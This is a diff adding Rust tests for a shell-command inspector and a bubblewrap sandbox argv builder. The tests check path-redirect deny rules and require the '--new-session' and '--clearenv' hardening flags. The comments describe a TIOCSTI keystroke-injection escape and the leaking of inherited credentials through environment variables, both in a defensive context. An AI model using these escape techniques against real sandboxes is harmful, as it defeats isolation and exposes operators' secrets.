+    /// must STILL be allowed after the normalizer was added — the
+    /// fix shouldn't over-match. The normalizer runs on every
+    /// target but only fires the deny on the canonicalised form
+    /// matching one of the listed sensitive roots.
+    #[test]
+    fn allows_normalised_unrelated_absolute_path() {
+        let v = inspect_shell_command("echo x > /home/user/x");
+        assert!(
+            matches!(v, ExecVerdict::Allow),
+            "redirect to /home/user/x is unrelated and must not be denied; got {v:?}"
+        );
+        // And the normalizer-collapsed cousin of the same path —
+        // `/home//user/./x` resolves to `/home/user/x` on the host
+        // and must also be allowed.
+        let v2 = inspect_shell_command("echo x > /home//user/./x");
+        assert!(
+            matches!(v2, ExecVerdict::Allow),
+            "normalised redirect `/home//user/./x` (resolves to /home/user/x) must not be \
+             denied; got {v2:?}"
+        );
+    }
+
+    /// Sanity guard: the normalizer must still respect the
+    /// relative-path guard rail. A repo-local `./etc/...` is NOT a
+    /// write to `/etc/...`; the post-normalization form is `etc/...`
+    /// which doesn't start with `/` and so doesn't match the
+    /// sensitive list. (The existing `allows_relative_redirect_to_
+    /// dot_slash_path` test pins the same property; this one uses a
+    /// deeper relative form to assert the broader property holds.)
+    #[test]
+    fn allows_deeply_relative_dot_slash_target() {
+        let v = inspect_shell_command("echo x > ./etc/note.txt");
+        assert!(
+            matches!(v, ExecVerdict::Allow),
+            "deeply-relative `./etc/note.txt` is a repo-local write and must not be denied; \
+             got {v:?}"
         );
     }
 
@@ -2176,14 +2762,61 @@ mod tests {
                 .map(|a| a.to_string_lossy().into_owned())
                 .collect::<Vec<_>>()
         );
-        // Workdir read-write bind: `--bind <cwd> <cwd>`. The argv
-        // generator uses canonical absolute paths for both source and
-        // destination so the bind lands at the operator-visible mount
-        // point, not at a bwrap-internal placeholder.
+        // Y-7: the argv MUST contain `--new-session`. Without it the
+        // sandboxed child shares the parent's controlling TTY and
+        // TIOCSTI becomes a documented command-injection escape.
+        assert!(
+            argv.iter().any(|a| a.to_string_lossy() == "--new-session"),
+            "argv must contain --new-session (TIOCSTI escape defense); got: {:?}",
+            argv.iter()
+                .map(|a| a.to_string_lossy().into_owned())
+                .collect::<Vec<_>>()
+        );
+        // Y-11: the argv MUST contain `--clearenv` (the parent
+        // env is the host's full credential state — API keys,
+        // AWS_*/GCP_*/AZURE_* creds, GITHUB_TOKEN — and a
+        // compromised `--check` would silently exfiltrate). The
+        // minimal allowlist (PATH, HOME, LANG, TERM) is re-injected
+        // via `--setenv VAR VALUE` triples; this default-options
+        // test pins presence only, the dedicated Y-11 test pins
+        // the entire allowlist.
+        assert!(
+            argv.iter().any(|a| a.to_string_lossy() == "--clearenv"),
+            "argv must contain --clearenv (env-leak defense); got: {:?}",
+            argv.iter()
+                .map(|a| a.to_string_lossy().into_owned())
+                .collect::<Vec<_>>()
+        );
+        // We need the converted argv_strings to check the
+        // `--setenv VAR VALUE` triples (the assertion uses
+        // `.windows(3)` on the strings). Hoist the conversion up
+        // here so the Y-7/Y-11 assertions use the same allocation
+        // as the later workdir-bind assertion below; we don't
+        // double-build.
         let argv_strings: Vec<String> = argv
             .iter()
             .map(|a| a.to_string_lossy().into_owned())
             .collect();
+        assert!(
+            argv_strings
+                .windows(3)
+                .any(|w| w[0] == "--setenv" && w[1] == "PATH"),
+            "argv must re-inject PATH from the minimal env allowlist; got: {:?}",
+            argv_strings
+        );
+        assert!(
+            argv_strings
+                .windows(3)
+                .any(|w| w[0] == "--setenv" && w[1] == "HOME"),
+            "argv must re-inject HOME from the minimal env allowlist; got: {:?}",
+            argv_strings
+        );
+        // Workdir read-write bind: `--bind <cwd> <cwd>`. The argv
+        // generator uses canonical absolute paths for both source and
+        // destination so the bind lands at the operator-visible mount
+        // point, not at a bwrap-internal placeholder. (Note:
+        // `argv_strings` was already declared above for the Y-7/Y-11
+        // assertions; we reuse that allocation here.)
         let bind_idx = argv_strings
             .iter()
             .position(|a| a == "--bind")
@@ -2680,6 +3313,145 @@ mod tests {
              predictable-payload escape channel); got: {:?}",
             argv_strings
         );
+    }
+
+    // -----------------------------------------------------------------------
+    // Y-7: --new-session on the bwrap argv (TIOCSTI escape defense)
+    // -----------------------------------------------------------------------
+    //
+    // The previous round's bubblewrap argv builder omitted
+    // `--new-session`, leaving the sandboxed child on the parent's
+    // controlling TTY. That makes the TIOCSTI ioctl a documented
+    // command-injection escape: any process that shares the same
+    // controlling tty (the loop driver itself, an SSH session the
+    // operator has, a debugger attached to a host process) can
+    // inject keystrokes into the child's stdin from a different
+    // security context, bypassing the filesystem sandbox. The fix
+    // adds `--new-session` (which calls setsid() for the wrapped
+    // child, putting it in a fresh session with no controlling
+    // tty) to the bwrap argv.
+    //
+    // The flag MUST appear before the bwrap argv `--` separator
+    // (it is a bwrap option, not a program arg). The test below
+    // pins presence + position; the dedicated dispatch integration
+    // test (`wrap_spawn_command_linux_bubblewrap_on_linux_…`) pins
+    // that the dispatch wires the flag through to the plan.
+    #[test]
+    fn bubblewrap_argv_default_includes_new_session() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let cwd = dir.path();
+        let argv_strings: Vec<String> =
+            generate_bubblewrap_argv(cwd, "echo hi", &LinuxBubblewrapProfileOptions::default())
+                .iter()
+                .map(|a| a.to_string_lossy().into_owned())
+                .collect();
+        // The flag MUST be present. Without it, the sandboxed child
+        // shares the parent's controlling TTY and TIOCSTI becomes
+        // a command-injection escape.
+        assert!(
+            argv_strings.iter().any(|a| a == "--new-session"),
+            "argv must contain --new-session (TIOCSTI command-injection escape defense); \
+             got: {:?}",
+            argv_strings
+        );
+        // The flag MUST appear BEFORE the bwrap argv separator `--`
+        // (it's a bwrap option, not a program argument; putting it
+        // after `--` would pass it as a flag to the wrapped
+        // command's argv, not to bwrap itself).
+        let new_session_idx = argv_strings
+            .iter()
+            .position(|a| a == "--new-session")
+            .expect("--new-session is present (checked above); position() must succeed");
+        let sep_idx = argv_strings
+            .iter()
+            .position(|a| a == "--")
+            .expect("argv must contain the `--` separator (post-condition of every test)");
+        assert!(
+            new_session_idx < sep_idx,
+            "--new-session must appear BEFORE the `--` argv separator (it's a bwrap option, \
+             not a program arg); got --new-session at {} and `--` at {} in argv: {:?}",
+            new_session_idx,
+            sep_idx,
+            argv_strings
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // Y-11: --clearenv + minimal env allowlist on the bwrap argv
+    // -----------------------------------------------------------------------
+    //
+    // The previous round's bwrap argv didn't call `--clearenv`, so
+    // the sandboxed child inherited the parent's full environment
+    // (API tokens, AWS_*/GCP_*/AZURE_* credentials, GITHUB_TOKEN, …).
+    // A compromised `--check` silently exfiltrated whatever the
+    // parent happened to have in its env. The fix: `--clearenv`
+    // wipes the inherited env, and subsequent `--setenv VAR VALUE`
+    // calls re-add ONLY the minimal allowlist (PATH, HOME, LANG,
+    // TERM) — the four vars a sane `--check` needs to function. We
+    // read each var from the PARENT env at argv-build time so the
+    // operator's actual PATH is preserved (Cargo binaries in
+    // `~/.cargo/bin` stay visible), with a built-in default if the
+    // parent doesn't carry the var.
+    #[test]
+    fn bubblewrap_argv_default_includes_clearenv_and_env_allowlist() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let cwd = dir.path();
+        let argv_strings: Vec<String> =
+            generate_bubblewrap_argv(cwd, "echo hi", &LinuxBubblewrapProfileOptions::default())
+                .iter()
+                .map(|a| a.to_string_lossy().into_owned())
+                .collect();
+        // (a) `--clearenv` MUST be present — without it the sandbox
+        // inherits the parent's full env. The flag MUST also be a
+        // bwrap option (not after `--`); the position is checked by
+        // the dispatch integration test.
+        assert!(
+            argv_strings.iter().any(|a| a == "--clearenv"),
+            "argv must contain --clearenv (env-leak defense: parent env is the operating-\
+             system's full credential state, including any tokens the loop driver is carrying); \
+             got: {:?}",
+            argv_strings
+        );
+        // (b) The minimal allowlist MUST be re-injected as
+        // `--setenv VAR VALUE` triples. Each var from the spec
+        // (PATH, HOME, LANG, TERM) must appear as a `--setenv VAR
+        // …` triple — the operator's PATH is preserved, AWS_TOKEN
+        // is not. We don't pin the VALUES here (those are the
+        // parent's at argv-build time, plus a built-in default);
+        // the test pins presence of the var name and the
+        // `--setenv` form. A regression that drops any of the four
+        // (or moves back to a no-clearenv state) is caught here.
+        for var in ["PATH", "HOME", "LANG", "TERM"] {
+            assert!(
+                argv_strings
+                    .windows(3)
+                    .any(|w| w[0] == "--setenv" && w[1] == var),
+                "argv must re-inject `--setenv {var} …` from the minimal env allowlist; \
+                 got: {:?}",
+                argv_strings
+            );
+        }
+        // (c) Belt-and-braces: NO env var OTHER than the
+        // allowlist should be re-injected by the post-Y-11 builder.
+        // (Other `--setenv` callers — there are none in the current
+        // code — would silently re-leak.) Pin that every `--setenv`
+        // in the argv names one of the four allowlisted vars; if a
+        // future change adds a `--setenv OTHER_VAR …`, the test
+        // names the new var explicitly so an operator-visible
+        // "the env allowlist grew" review fires.
+        let allowlist: std::collections::HashSet<&str> =
+            ["PATH", "HOME", "LANG", "TERM"].into_iter().collect();
+        for window in argv_strings.windows(3) {
+            if window[0] == "--setenv" {
+                assert!(
+                    allowlist.contains(window[1].as_str()),
+                    "--setenv re-injects a var not on the minimal allowlist ({}); pin it in \
+                     the allowlist explicitly when adding a new var; got argv: {:?}",
+                    window[1],
+                    argv_strings
+                );
+            }
+        }
     }
 
     // -----------------------------------------------------------------------
